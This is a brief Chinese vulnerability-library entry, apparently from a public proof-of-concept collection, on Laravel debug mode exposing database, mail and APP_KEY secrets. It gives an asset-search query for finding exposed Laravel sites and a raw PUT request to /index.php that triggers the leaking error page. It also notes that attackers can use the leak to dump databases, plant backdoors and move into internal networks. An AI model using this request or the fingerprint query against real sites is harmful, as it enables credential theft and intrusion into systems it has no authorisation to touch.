---
fofa: "app.name=="
source: "wy876 漏洞文库"
---

# laravel开启debug模式信息泄露漏洞

# 一、漏洞简介
<font style="color:rgba(0, 0, 0, 0.9);">laravel因配置不当会泄露MySQL，Redis，Elastic，Mongodb，neo4j，postgresql，SQLServer，Oracle，Firebird，sqlite，mail账号密码和APP</font><font style="color:rgb(215, 186, 125);">\_</font><font style="color:rgba(0, 0, 0, 0.9);">KEY等敏感信息。黑客可以利用这些信息进行脱库，或者在服务器植入后门，也可以利用数据库服务器进行跳板入侵内网其他重要服务器。</font>

# <font style="color:rgba(0, 0, 0, 0.9);">二、影响版本</font>
+ <font style="color:rgba(0, 0, 0, 0.9);">laravel</font>

# <font style="color:rgba(0, 0, 0, 0.9);">三、资产测绘</font>
+ hunter`app.name=="Laravel Default Page"`
+ 特征


# 四、漏洞复现
```plain
PUT /index.php HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36
Connection: close
Accept-Encoding: gzip, deflate
Content-Length: 0
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/tgvd9mmhbtzgbv2k>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
